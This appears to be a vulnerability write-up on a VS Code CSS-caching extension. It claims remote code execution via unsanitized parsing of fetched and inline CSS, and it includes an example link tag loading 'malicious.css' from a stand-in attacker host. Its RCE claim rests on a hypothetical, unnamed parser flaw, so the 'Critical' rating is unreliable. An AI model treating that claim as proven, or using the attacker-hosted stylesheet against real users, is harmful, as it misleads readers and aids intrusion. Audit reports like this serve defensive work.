# Vulnerability Assessment

## Code Injection via Unsanitized CSS Parsing

### Description
The extension automatically scans the workspace for HTML files and processes both inline style blocks and externally linked stylesheets. When processing an HTML file, the extension uses an HTML parser (from the "htmlparser2" library) to extract external stylesheet URLs from `<link>` tags as well as inline CSS from `<style>` tags. It then fetches any external CSS (using the "request-promise" library) and passes all CSS content directly to the CSS parser (via the "css.parse" function) without any validation or sanitization.  

**Step by step how an attacker can trigger this:**  
1. An attacker creates a repository in which one or more HTML files include a `<link rel="stylesheet" href="http://attacker.com/malicious.css">` tag or embeds a `<style>` block containing malicious CSS content.  
2. The malicious CSS is designed (using techniques known to exploit vulnerabilities in CSS parsing libraries) to trigger unintended behavior—potentially taking advantage of a flaw in the underlying css parser.  
3. When a victim opens this repository in VS Code, the extension's caching process runs (either automatically on load or by executing the "Cache CSS class definitions" command).  
4. During caching, the extension's HTML parsing code collects the external URL and inline style contents.  
5. The extension then issues an HTTP GET (via `request.get(url)`) to fetch the external CSS and immediately passes the content to `css.parse(content)`.  
6. If the malicious CSS payload triggers code injection in the vulnerable parsing library, it may result in arbitrary code execution in the context of the VS Code extension host.

### Impact
An attacker can achieve remote code execution (RCE) inside the victim's VS Code instance. Since VS Code extensions run with the user's privileges, this could permit executing arbitrary code, reading or modifying files, and compromising the system running VS Code.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- There is no explicit validation or sanitization of external URLs or CSS content in the current code.  
- The extension directly uses the CSS parser without any safety wrappers for content fetched from external sources or embedded in HTML.

### Missing Mitigations
- **Validation/Sanitization:** The extension should validate and sanitize any URL (or CSS content) before fetching or parsing it.  
- **Restrict External Requests:** Only allow external stylesheet fetching from a whitelist of trusted domains or make this feature opt-in.  
- **Safe Parsing Mode:** Use a parser mode (or an alternative parsing library) that does not risk code injection when handling untrusted content.  
- **Error Handling/Timeouts:** While there is some error handling around the fetching and parsing, it does not mitigate the risk from malicious payloads designed to exploit parsing logic.

### Preconditions
- The victim must open a repository in VS Code that contains a manipulated HTML file with either:  
  • A `<link>` tag that references an external stylesheet hosted on an attacker‑controlled server, or  
  • An inline `<style>` block containing malicious CSS designed to exploit potential vulnerabilities in the CSS parsing library.  
- The external CSS parser (the "css" library) must have a vulnerability that can be triggered by carefully crafted CSS input.

### Source Code Analysis
- **File:** `src/parse-engines/types/html-parse-engine.ts`  
  - The parser is configured with several callbacks. In the `onattribute` callback, if the current tag is `"link"` and the attribute name is `"href"` (with a value starting with `"http"`), it stores the URL in the variable `linkHref`.  
  - In the `onclosetag` callback, if the tag was `"link"` and the conditions (the stylesheet is marked by the `rel="stylesheet"` attribute and a valid URL was recorded) are met, the URL is pushed into an array (`urls`).  
  - After parsing the document, the code iterates over each URL using `Bluebird.map` and performs:
    - `const content = await request.get(url);`
    - `definitions.push(...CssClassExtractor.extract(css.parse(content)));`
  - In addition, the `ontext` callback for a `<style>` tag directly passes the inline CSS content to `css.parse(text)`.  
- **Analysis Summary:**  
  The extension does not perform any checks on the URL or the CSS content being parsed. Whether the CSS is inline or fetched externally, the content is immediately passed to `css.parse`. If an attacker's payload is crafted to exploit a weakness in the css parsing library (or in the subsequent extraction logic), it could lead to code injection and arbitrary code execution.

### Security Test Case
1. **Set Up Controlled Environment:**  
   - Deploy a test web server (simulating an attacker-controlled server) that serves a crafted malicious CSS file (e.g., `malicious.css`) containing payload data known to trigger the vulnerability in the CSS parser.
2. **Prepare the Malicious Repository:**  
   - Create an HTML file (for instance, `index.html`) with the following content:
     ```html
     <html>
       <head>
         <link rel="stylesheet" href="http://<ATTACKER_SERVER>/malicious.css">
       </head>
       <body>
         <p>Test page</p>
       </body>
     </html>
     ```
   - Optionally, also include a `<style>` block with malicious CSS content to test the inline parsing.
3. **Run VS Code and Load the Repository:**  
   - Open the manipulated repository in VS Code with the vulnerable extension installed.
4. **Trigger the Caching Process:**  
   - Either wait for the extension to trigger caching automatically or manually execute the "Cache CSS class definitions" command.
5. **Observe Extension Behavior:**  
   - Monitor the VS Code developer console and network activity to verify that the extension makes an HTTP GET to the attacker-controlled URL.  
   - In a controlled test environment (using benign payloads that simulate the code injection), check for signs that the parsed CSS payload is "executed" (for example, by detecting log messages, triggered callbacks, or other indicators defined in the test payload).
6. **Determine Success:**  
   - If the payload executes (or if you can simulate its effects safely in a test environment), this confirms that the vulnerability is exploitable, demonstrating the risk of code injection via unsanitized CSS parsing.